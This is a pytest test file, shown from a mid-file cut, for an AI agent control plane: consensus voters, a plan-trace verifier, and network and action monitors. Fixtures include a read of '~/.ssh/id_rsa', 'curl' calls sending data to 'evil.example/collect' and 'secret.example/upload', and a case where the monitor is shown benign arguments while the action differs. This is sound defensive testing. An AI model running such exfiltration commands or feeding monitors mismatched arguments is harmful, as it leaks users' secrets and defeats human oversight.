    assert restarted.active_plan_hash(origin.session_id) == ""
    cancelled = restarted._trace_verifier._plans[origin.session_id]
    assert cancelled.cancelled is True
    assert cancelled.cancelled_reason == "trace_accounting_plan_binding_unavailable"
    persisted_history = [
        json.loads(line) for line in history_path.read_text(encoding="utf-8").splitlines()
    ]
    assert len(persisted_history) == 1


class _StaticVoter:
    def __init__(self, vote: VoterDecision) -> None:
        self._vote = vote

    async def cast_vote(self, data: ConsensusInput) -> VoterDecision:
        _ = data
        return self._vote


@pytest.mark.asyncio
async def test_m5_t10_consensus_thresholds_apply_correctly() -> None:
    action = build_action(
        tool_name="file.read",
        arguments={"path": "README.md"},
        origin=_origin("s-consensus"),
    )
    data = ConsensusInput(
        action=action,
        trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
    )
    system = ConsensusVotingSystem(
        voters=[
            _StaticVoter(
                VoterDecision(
                    voter="v1",
                    decision=VoteKind.ALLOW,
                    risk_tier=RiskTier.LOW,
                    reason_codes=["allow"],
                )
            ),
            _StaticVoter(
                VoterDecision(
                    voter="v2",
                    decision=VoteKind.ALLOW,
                    risk_tier=RiskTier.LOW,
                    reason_codes=["allow"],
                )
            ),
            _StaticVoter(
                VoterDecision(
                    voter="v3",
                    decision=VoteKind.FLAG,
                    risk_tier=RiskTier.LOW,
                    reason_codes=["flag"],
                )
            ),
        ],
        policy=ConsensusPolicy(required_approvals_low=2),
    )
    decision = await system.evaluate(data)
    assert decision.decision.value == "require_confirmation"


@pytest.mark.asyncio
async def test_m5_t11_consensus_veto_works_for_high_risk() -> None:
    action = build_action(
        tool_name="shell_exec",
        arguments={"command": ["python", "-c", "print('ok')"]},
        origin=_origin("s-veto"),
        risk_tier=RiskTier.HIGH,
    )
    data = ConsensusInput(
        action=action,
        trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
    )
    system = ConsensusVotingSystem(
        voters=[
            _StaticVoter(
                VoterDecision(
                    voter="allow-voter",
                    decision=VoteKind.ALLOW,
                    risk_tier=RiskTier.HIGH,
                    reason_codes=["allow"],
                )
            ),
            _StaticVoter(
                VoterDecision(
                    voter="reject-voter",
                    decision=VoteKind.BLOCK,
                    risk_tier=RiskTier.HIGH,
                    reason_codes=["reject"],
                )
            ),
        ],
        policy=ConsensusPolicy(required_approvals_high=1, veto_for_high_and_critical=True),
    )
    decision = await system.evaluate(data)
    assert decision.decision.value == "block"
    assert any(code.startswith("consensus:veto:") for code in decision.reason_codes)


@pytest.mark.asyncio
async def test_m5_rt2_resource_voter_blocks_high_risk_sensitive_access() -> None:
    history = SessionActionHistoryStore()
    monitor = ResourceAccessMonitor()
    voter = ResourceVoter(monitor=monitor, history=history)
    action = build_action(
        tool_name="file.read",
        arguments={"path": "~/.ssh/id_rsa"},
        origin=_origin("s-rt2"),
        risk_tier=RiskTier.HIGH,
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
        )
    )
    assert decision.decision == VoteKind.BLOCK
    assert decision.risk_tier == RiskTier.HIGH


class _SleepVoter:
    def __init__(self, voter: str, delay_seconds: float) -> None:
        self._voter = voter
        self._delay_seconds = delay_seconds

    async def cast_vote(self, data: ConsensusInput) -> VoterDecision:
        _ = data
        await asyncio.sleep(self._delay_seconds)
        return VoterDecision(
            voter=self._voter,
            decision=VoteKind.ALLOW,
            risk_tier=RiskTier.LOW,
            reason_codes=["allow"],
        )


@pytest.mark.asyncio
async def test_m5_rt3_consensus_runs_voters_in_parallel() -> None:
    action = build_action(
        tool_name="file.read",
        arguments={"path": "README.md"},
        origin=_origin("s-rt3"),
    )
    data = ConsensusInput(
        action=action,
        trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
    )
    system = ConsensusVotingSystem(
        voters=[_SleepVoter(f"v{i}", 0.05) for i in range(5)],
        policy=ConsensusPolicy(required_approvals_low=5, voter_timeout_seconds=0.5),
    )
    start = asyncio.get_running_loop().time()
    decision = await system.evaluate(data)
    elapsed = asyncio.get_running_loop().time() - start
    assert decision.decision.value == "allow"
    assert elapsed < 0.18


def test_m5_t15_action_normalization_maps_aliases_to_canonical_kind() -> None:
    assert infer_action_kind("file_read", {"path": "README.md"}) == ActionKind.FS_READ
    assert (
        infer_action_kind(
            "shell.exec",
            {"command": ["python", "-c", "print('ok')"]},
        )
        == ActionKind.SHELL_EXEC
    )
    assert (
        infer_action_kind(
            "shell.exec",
            {"command": ["curl", "https://example.com"]},
        )
        == ActionKind.EGRESS
    )


def test_s9_infer_action_kind_treats_web_search_as_egress() -> None:
    assert infer_action_kind("web.search", {"query": "security updates"}) == ActionKind.EGRESS


def test_gh60_infer_action_kind_treats_time_now_as_runtime_read() -> None:
    assert infer_action_kind("time.now", {}) == ActionKind.RUNTIME_READ


def test_gh82_infer_action_kind_treats_mcp_tools_as_external_actions() -> None:
    assert (
        infer_action_kind("mcp.todoist.find-tasks-by-date", {"filter": "today"})
        == ActionKind.MCP_EXTERNAL
    )
    assert infer_action_kind("mcp.docs.lookup-doc", {"query": "roadmap"}) == ActionKind.MCP_EXTERNAL


def test_gh82_trace_allows_known_mcp_external_action_to_reach_pep() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-gh82-mcp-trace")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="List my Todoist tasks due today using Todoist MCP.",
        origin=origin,
        capabilities={Capability.HTTP_REQUEST},
    )
    action = build_action(
        tool_name="mcp.todoist.find-tasks-by-date",
        arguments={"filter": "today", "limit": 10},
        origin=origin,
    )

    assert action.action_kind == ActionKind.MCP_EXTERNAL
    result = verifier.verify_action(session_id=origin.session_id, action=action)

    assert result.allowed is True
    assert result.reason_code == "trace:allowed"


def test_m6_infer_action_kind_treats_browser_tools_as_browser_read_write() -> None:
    assert infer_action_kind("browser.navigate", {"url": "https://example.com"}) == (
        ActionKind.BROWSER_READ
    )
    assert infer_action_kind("browser.read_page", {}) == ActionKind.BROWSER_READ
    assert infer_action_kind("browser.screenshot", {}) == ActionKind.BROWSER_READ
    assert infer_action_kind("browser.click", {"target": "#continue"}) == (ActionKind.BROWSER_WRITE)
    assert infer_action_kind("browser.type_text", {"target": "#search", "text": "hello"}) == (
        ActionKind.BROWSER_WRITE
    )


def test_s9_infer_action_kind_treats_fs_list_without_path_as_fs_list() -> None:
    assert infer_action_kind("fs.list", {}) == ActionKind.FS_LIST


def test_s9_infer_action_kind_treats_git_status_as_fs_read() -> None:
    assert infer_action_kind("git.status", {}) == ActionKind.FS_READ


def test_m1_infer_action_kind_covers_note_todo_and_reminder_tools() -> None:
    assert infer_action_kind("note.search", {"query": "groceries"}) == ActionKind.MEMORY_READ
    assert infer_action_kind("todo.complete", {"selector": "buy milk"}) == ActionKind.MEMORY_WRITE
    assert infer_action_kind("reminder.create", {"message": "stand up", "when": "in 1 minute"}) == (
        ActionKind.MEMORY_WRITE
    )


def test_m5_rt9_command_filename_token_is_not_misclassified_as_egress() -> None:
    kind = infer_action_kind(
        "shell.exec",
        {"command": ["cat", "config.json"]},
    )
    assert kind != ActionKind.EGRESS


@pytest.mark.parametrize(
    "goal",
    [
        "list the files in the folder you're in",
        "list the files in the folder",
        "show the directory here",
    ],
)
def test_m5_rt10_trace_allows_fs_list_without_path_arguments_when_goal_points_at_workspace(
    tmp_path: Path,
    goal: str,
) -> None:
    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    origin = _origin("s-rt10")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal=goal,
        origin=origin,
    )
    action = build_action(
        tool_name="fs.list",
        arguments={},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is True
    assert result.reason_code == "trace:allowed"


def test_h4_trace_workspace_hint_does_not_preapprove_child_reads(tmp_path: Path) -> None:
    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    origin = _origin("s-h4-workspace-hint")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="list the files in the folder you're in",
        origin=origin,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="fs.read",
        arguments={"path": "README.md"},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:tdg_confirmation_required"


def test_h4_trace_allows_goal_rooted_fs_read_path() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-h4-goal-read")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="read README.md",
        origin=origin,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="fs.read",
        arguments={"path": "README.md"},
        origin=origin,
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is True
    assert result.reason_code == "trace:allowed"


def test_h4_trace_allows_clean_command_declared_roots_for_vague_goal(tmp_path: Path) -> None:
    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    origin = _origin("s-h4-declared-root")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="fix the typo",
        origin=origin,
        capabilities={Capability.FILE_READ},
        declared_resource_roots={"README.md"},
    )
    action = build_action(
        tool_name="fs.read",
        arguments={"path": "README.md"},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is True
    assert result.reason_code == "trace:allowed"
    plan = verifier.active_plan(origin.session_id)
    assert plan is not None
    assert plan.declared_resource_roots == {str((tmp_path / "README.md").resolve(strict=False))}


def test_h4_trace_plan_hash_binds_declared_resource_roots(tmp_path: Path) -> None:
    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    origin = _origin("s-h4-root-hash")
    first = verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="fix the typo",
        origin=origin,
        capabilities={Capability.FILE_READ},
        declared_resource_roots={"README.md"},
    )
    second = verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="fix the typo",
        origin=origin,
        capabilities={Capability.FILE_READ},
        declared_resource_roots={"CHANGELOG.md"},
    )
    assert first.plan_hash != second.plan_hash


def test_h4_trace_normalizes_declared_url_roots_to_hosts() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-h4-url-root")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="review the docs",
        origin=origin,
        capabilities={Capability.HTTP_REQUEST},
        declared_resource_roots={"https://example.com/docs/start"},
    )
    plan = verifier.active_plan(origin.session_id)
    assert plan is not None
    assert plan.declared_resource_roots == {"example.com"}


def test_h4_trace_allows_goal_rooted_fs_read_for_bare_readme_request() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-h4-goal-readme")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="read the README",
        origin=origin,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="fs.read",
        arguments={"path": "README.md"},
        origin=origin,
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is True
    assert result.reason_code == "trace:allowed"


def test_h4_trace_missing_path_read_requires_confirmation() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-h4-read-confirm")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="say hello",
        origin=origin,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="fs.read",
        arguments={"path": "README.md"},
        origin=origin,
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:tdg_confirmation_required"


def test_h4_trace_default_fs_list_without_goal_path_requires_confirmation(tmp_path: Path) -> None:
    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    origin = _origin("s-h4-list-confirm")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="say hello",
        origin=origin,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="fs.list",
        arguments={},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:tdg_confirmation_required"


def test_h4_trace_default_git_status_is_workspace_rooted(tmp_path: Path) -> None:
    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    origin = _origin("s-h4-git-status")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="show me the git status",
        origin=origin,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="git.status",
        arguments={},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    assert action.resource_ids == [str(tmp_path.resolve(strict=False))]
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is True
    assert result.reason_code == "trace:allowed"


@pytest.mark.parametrize(
    ("goal", "tool_name"),
    [
        ("git status", "git.status"),
        ("git diff", "git.diff"),
        ("git log", "git.log"),
    ],
)
def test_h4_trace_bare_git_commands_are_workspace_rooted(
    tmp_path: Path,
    goal: str,
    tool_name: str,
) -> None:
    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    origin = _origin(f"s-h4-bare-{tool_name}")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal=goal,
        origin=origin,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name=tool_name,
        arguments={},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    assert action.resource_ids == [str(tmp_path.resolve(strict=False))]
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is True
    assert result.reason_code == "trace:allowed"


def test_h4_trace_conceptual_git_mentions_do_not_seed_workspace_root(tmp_path: Path) -> None:
    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    origin = _origin("s-h4-git-concept")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="Explain what git status means and when to use it.",
        origin=origin,
        capabilities={Capability.FILE_READ},
    )
    plan = verifier.active_plan(origin.session_id)
    assert plan is not None
    assert f"workspace_root:{tmp_path.resolve(strict=False)}" not in plan.goal_resource_patterns
    action = build_action(
        tool_name="git.status",
        arguments={},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:tdg_confirmation_required"


def test_h4_trace_missing_path_side_effect_blocks() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-h4-write-block")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="say hello",
        origin=origin,
        capabilities={Capability.FILE_WRITE},
    )
    action = build_action(
        tool_name="fs.write",
        arguments={"path": "notes.txt", "content": "hello"},
        origin=origin,
        risk_tier=RiskTier.MEDIUM,
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:tdg_dependency_path_missing"


def test_h4_trace_stage2_approved_side_effect_allows_fresh_dependency_path() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-h4-stage2")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="say hello",
        origin=origin,
        capabilities={Capability.FILE_WRITE},
    )
    action = build_action(
        tool_name="fs.write",
        arguments={"path": "notes.txt", "content": "hello"},
        origin=origin,
        risk_tier=RiskTier.MEDIUM,
    )
    blocked = verifier.verify_action(session_id=origin.session_id, action=action)
    assert blocked.reason_code == "trace:tdg_dependency_path_missing"

    verifier.amend(
        session_id=origin.session_id,
        approved_by="human_confirmation",
        allow_actions={action.action_kind},
        allow_resources=set(action.resource_ids),
    )
    allowed = verifier.verify_action(session_id=origin.session_id, action=action)
    assert allowed.allowed is True
    assert allowed.reason_code == "trace:allowed"


def test_h4_trace_blocks_multi_host_egress_when_any_sink_is_ungrounded() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-h4-multi-host")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="fetch https://example.com",
        origin=origin,
        capabilities={Capability.HTTP_REQUEST},
    )
    action = build_action(
        tool_name="http.request",
        arguments={
            "command": ["curl", "https://evil.example/collect"],
            "network_urls": ["https://example.com"],
        },
        origin=origin,
        risk_tier=RiskTier.HIGH,
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:tdg_dependency_path_missing"


def test_h4_trace_bare_filename_fallback_stays_directory_scoped(tmp_path: Path) -> None:
    workspace_root = tmp_path / "workspace"
    workspace_root.mkdir()
    other_root = tmp_path / "other"
    other_root.mkdir()
    verifier = ExecutionTraceVerifier(workspace_roots=[workspace_root])
    origin = _origin("s-h4-readme-scope")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="read the README",
        origin=origin,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="fs.read",
        arguments={"path": str(other_root / "README.md")},
        origin=origin,
        workspace_roots=[workspace_root],
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:tdg_confirmation_required"


def test_m6_trace_requires_stage2_for_browser_write_actions() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-m6-browser-write")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="click continue in the browser",
        origin=origin,
        capabilities={Capability.HTTP_REQUEST},
    )
    action = build_action(
        tool_name="browser.click",
        arguments={"target": "#continue"},
        origin=origin,
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:stage2_upgrade_required"


def test_h4_trace_browser_write_without_destination_stays_ungrounded_after_stage2() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-h4-browser-sink")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="review http://127.0.0.1:8765/",
        origin=origin,
        capabilities={Capability.HTTP_REQUEST},
    )
    approved = build_action(
        tool_name="browser.click",
        arguments={"destination": "http://127.0.0.1:8765/", "target": "#continue"},
        origin=origin,
    )
    verifier.amend(
        session_id=origin.session_id,
        approved_by="human_confirmation",
        allow_actions={approved.action_kind},
        allow_resources=set(approved.resource_ids),
    )
    action = build_action(
        tool_name="browser.click",
        arguments={"source_url": "http://127.0.0.1:8765/", "target": "#continue"},
        origin=origin,
    )
    assert action.resource_ids == []
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:tdg_dependency_path_missing"


def test_m5_t16_control_plane_metadata_events_exclude_raw_payload_fields() -> None:
    disallowed = {
        "payload",
        "body",
        "raw_args",
        "request_body",
        "request_headers",
        "arguments",
        "raw_text",
    }
    for event_type in (
        ProxyRequestEvaluated,
        ControlPlaneActionObserved,
        ControlPlaneResourceObserved,
        ControlPlaneNetworkObserved,
    ):
        assert disallowed.isdisjoint(set(event_type.model_fields))

    cleaned = sanitize_metadata_payload(
        {
            "tool_name": "http_request",
            "request_body": "secret",
            "headers": {"authorization": "token"},
            "raw_args": {"command": ["curl", "https://example.com"]},
            "resource_ids": ["/tmp/a"],
        }
    )
    assert "request_body" not in cleaned
    assert "headers" not in cleaned
    assert "raw_args" not in cleaned
    assert cleaned["resource_ids"] == ["/tmp/a"]


class _SlowMonitorProvider:
    async def complete(
        self,
        messages: list[Message],
        tools: list[dict[str, object]] | None = None,
    ) -> ProviderResponse:
        _ = messages, tools
        await asyncio.sleep(0.05)
        return ProviderResponse(
            message=Message(
                role="assistant",
                content='{"decision":"ALLOW","reason_codes":["network:slow"]}',
            ),
            finish_reason="stop",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )


@pytest.mark.asyncio
async def test_m5_t17_high_critical_monitor_timeout_cannot_fail_open() -> None:
    monitor = NetworkIntelligenceMonitor(
        baseline_db=BaselineDatabase(),
        monitor_provider=_SlowMonitorProvider(),
        timeout_seconds=0.01,
        high_critical_timeout_action="ALLOW",
        low_medium_timeout_action="FLAG",
    )
    metadata = extract_network_metadata(
        origin=_origin("s-timeout"),
        tool_name="http_request",
        destination_host="timeout.example",
        destination_port=443,
        protocol="https",
        request_size=64,
    )
    decision = await monitor.evaluate(
        metadata=metadata,
        declared_domains=[],
        risk_tier=RiskTier.HIGH,
    )
    assert decision.timed_out is True
    assert decision.decision != "ALLOW"


@pytest.mark.asyncio
async def test_m6_low_risk_declared_domain_timeout_uses_heuristic_allow() -> None:
    monitor = NetworkIntelligenceMonitor(
        baseline_db=BaselineDatabase(),
        monitor_provider=_SlowMonitorProvider(),
        timeout_seconds=0.01,
        high_critical_timeout_action="BLOCK",
        low_medium_timeout_action="FLAG",
    )
    metadata = extract_network_metadata(
        origin=_origin("s-browser-timeout"),
        tool_name="browser.navigate",
        destination_host="localhost",
        destination_port=443,
        protocol="https",
        request_size=0,
    )
    decision = await monitor.evaluate(
        metadata=metadata,
        declared_domains=["localhost"],
        risk_tier=RiskTier.LOW,
    )
    assert decision.timed_out is True
    assert decision.decision == "ALLOW"
    assert "network:monitor_timeout_heuristic_allow" in decision.reason_codes


@pytest.mark.asyncio
async def test_m5_rt10_network_cache_does_not_reuse_allow_across_contexts() -> None:
    monitor = NetworkIntelligenceMonitor(
        baseline_db=BaselineDatabase(),
        cache_ttl_seconds=300,
    )
    first_origin = Origin(
        session_id="s-cache-1",
        user_id="user-a",
        workspace_id="ws-a",
        skill_name="skill-x",
        actor="planner",
    )
    second_origin = Origin(
        session_id="s-cache-2",
        user_id="user-b",
        workspace_id="ws-b",
        skill_name="skill-x",
        actor="planner",
    )

    first = extract_network_metadata(
        origin=first_origin,
        tool_name="http_request",
        destination_host="api.good.example",
        destination_port=443,
        protocol="https",
        request_size=128,
    )
    second = extract_network_metadata(
        origin=second_origin,
        tool_name="http_request",
        destination_host="api.good.example",
        destination_port=443,
        protocol="https",
        request_size=128,
    )
    _ = await monitor.evaluate(
        metadata=first,
        declared_domains=["api.good.example"],
        risk_tier=RiskTier.LOW,
    )
    second_decision = await monitor.evaluate(
        metadata=second,
        declared_domains=[],
        risk_tier=RiskTier.HIGH,
    )
    assert second_decision.decision != "ALLOW"
    assert "network:undeclared_new_domain" in second_decision.reason_codes


def test_m5_t18_plan_lifecycle_expiry_cancel_amendment_semantics() -> None:
    verifier = ExecutionTraceVerifier(default_ttl_seconds=60)
    origin = _origin("s-lifecycle")

    first = verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize docs",
        origin=origin,
    )
    assert verifier.active_plan(origin.session_id) is not None
    assert verifier.cancel(session_id=origin.session_id, reason="manual") is True
    assert verifier.active_plan(origin.session_id) is None

    second = verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize docs",
        origin=origin,
    )
    amended = verifier.amend(
        session_id=origin.session_id,
        approved_by="human",
        allow_actions={ActionKind.EGRESS},
        allow_resources={"*.example.com"},
    )
    assert amended.stage == PlanStage.STAGE2_POSTEVIDENCE
    assert amended.amendment_of == second.plan_hash
    verifier._plans[origin.session_id].expires_at = datetime.now(UTC) - timedelta(seconds=1)
    assert verifier.active_plan(origin.session_id) is None
    assert first.plan_hash != second.plan_hash


@pytest.mark.asyncio
async def test_gh33_control_plane_uses_raw_action_and_redacted_monitor_payload(
    tmp_path: Path,
) -> None:
    engine = ControlPlaneEngine.build(
        data_dir=tmp_path / "cp-gh33-raw-action-redacted-monitor",
    )

    evaluation = await engine.evaluate_action(
        tool_name="shell.exec",
        arguments={"command": ["curl", "https://secret.example/upload"]},
        monitor_arguments={},
        origin=_origin("s-gh33-raw-action-redacted-monitor"),
        risk_tier=RiskTier.HIGH,
        declared_domains=[],
        session_tainted=True,
        trusted_input=True,
        raw_user_text="[sensitive text redacted]",
    )

    assert evaluation.action.action_kind == ActionKind.EGRESS
    assert evaluation.action.network_hosts == ["secret.example"]
    amv_vote = next(
        vote for vote in evaluation.consensus.votes if vote.voter == "ActionMonitorVoter"
    )
    assert "action_monitor:side_effect_on_tainted_session" in amv_vote.reason_codes
    assert "secret.example" not in json.dumps(amv_vote.details)
    assert "curl" not in json.dumps(amv_vote.details)


@pytest.mark.asyncio
async def test_f1_engine_preserves_long_current_turn_reminder_authority(
    tmp_path: Path,
) -> None:
    engine = ControlPlaneEngine.build(
        data_dir=tmp_path / "cp-f1-long-current-turn-reminder",
    )
    origin = _origin("s-f1-long-current-turn-reminder")
    message = f"review {'x' * 300}"
    current_turn = f"set a reminder to {message} in 2 minutes"
    arguments = {
        "message": message,
        "when": "in 2 minutes",
        "reminder_intent": "current_turn_reminder_create",
    }
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal=current_turn,
        origin=origin,
        ttl_seconds=1800,
        max_actions=10,
        capabilities={Capability.MEMORY_WRITE},
    )
    _append_recent_memory_read_burst(
        engine._history_store,
        origin=origin,
        now=datetime.now(UTC) - timedelta(milliseconds=450),
    )

    evaluation = await engine.evaluate_action(
        tool_name="reminder.create",
        arguments=arguments,
        monitor_arguments=arguments,
        origin=origin,
        risk_tier=RiskTier.MEDIUM,
        declared_domains=[],
        session_tainted=True,
        trusted_input=True,
        operator_owned_cli_input=True,
        raw_user_text=current_turn,
    )

    assert evaluation.trace_result.allowed is True
    sequence_vote = next(
        vote for vote in evaluation.consensus.votes if vote.voter == "BehavioralSequenceAnalyzer"
    )
    action_monitor_vote = next(
        vote for vote in evaluation.consensus.votes if vote.voter == "ActionMonitorVoter"
    )
    assert sequence_vote.decision == VoteKind.ALLOW
    assert "sequence:allow_structural_current_turn_reminder" in sequence_vote.reason_codes
    assert action_monitor_vote.decision == VoteKind.ALLOW
    assert "action_monitor:current_turn_anchored" in action_monitor_vote.reason_codes


@pytest.mark.asyncio
async def test_f1_engine_reminder_authority_proof_binds_actual_arguments(
    tmp_path: Path,
) -> None:
    engine = ControlPlaneEngine.build(
        data_dir=tmp_path / "cp-f1-reminder-proof-action-binding",
    )
    origin = _origin("s-f1-reminder-proof-action-binding")
    benign_message = f"review {'x' * 300}"
    current_turn = f"set a reminder to {benign_message} in 2 minutes"
    monitor_arguments = {
        "message": benign_message,
        "when": "in 2 minutes",
        "reminder_intent": "current_turn_reminder_create",
    }
    action_arguments = {
        "message": "archive credentials",
        "when": "in 2 minutes",
        "reminder_intent": "current_turn_reminder_create",
    }
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal=current_turn,
        origin=origin,
        ttl_seconds=1800,
        max_actions=10,
        capabilities={Capability.MEMORY_WRITE},
    )
    _append_recent_memory_read_burst(
        engine._history_store,
        origin=origin,
        now=datetime.now(UTC) - timedelta(milliseconds=450),
    )

    evaluation = await engine.evaluate_action(
        tool_name="reminder.create",
        arguments=action_arguments,
        monitor_arguments=monitor_arguments,
        origin=origin,
        risk_tier=RiskTier.MEDIUM,
        declared_domains=[],
        session_tainted=True,
        trusted_input=True,
        operator_owned_cli_input=True,
        raw_user_text=current_turn,
    )

    sequence_vote = next(
        vote for vote in evaluation.consensus.votes if vote.voter == "BehavioralSequenceAnalyzer"
    )
    action_monitor_vote = next(
        vote for vote in evaluation.consensus.votes if vote.voter == "ActionMonitorVoter"
    )
    assert sequence_vote.decision == VoteKind.BLOCK
    assert "sequence:allow_structural_current_turn_reminder" not in sequence_vote.reason_codes
    assert action_monitor_vote.decision == VoteKind.FLAG
    assert "action_monitor:current_turn_anchored" not in action_monitor_vote.reason_codes


@pytest.mark.asyncio
async def test_m5_t20_action_monitor_voter_rejects_raw_text_payloads() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="file.read",
        arguments={"path": "README.md"},
        origin=_origin("s-action-monitor"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={"raw_text": "forbidden"},
        )
    )
    assert decision.decision == VoteKind.BLOCK
    assert decision.risk_tier == RiskTier.CRITICAL


@pytest.mark.asyncio
async def test_m1_rlc7_action_monitor_voter_allows_clean_trusted_side_effect() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="web.search",
        arguments={"query": "latest news"},
        origin=_origin("s-action-monitor-clean"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": False,
                "trusted_input": True,
            },
        )
    )
    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "action_monitor:clean_session_trust_planner" in decision.reason_codes


@pytest.mark.asyncio
async def test_m1_rlc7_action_monitor_voter_flags_tainted_side_effect() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="web.search",
        arguments={"query": "latest news"},
        origin=_origin("s-action-monitor-tainted"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert decision.risk_tier == RiskTier.HIGH
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_allows_current_turn_anchored_search_on_tainted_context() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="web.search",
        arguments={"query": "shisa.ai", "limit": 3},
        origin=_origin("s-action-monitor-anchor-search"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "search the web for shisa.ai and tell me what they do",
                "action_arguments": {"query": "shisa.ai", "limit": 3},
            },
        )
    )
    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
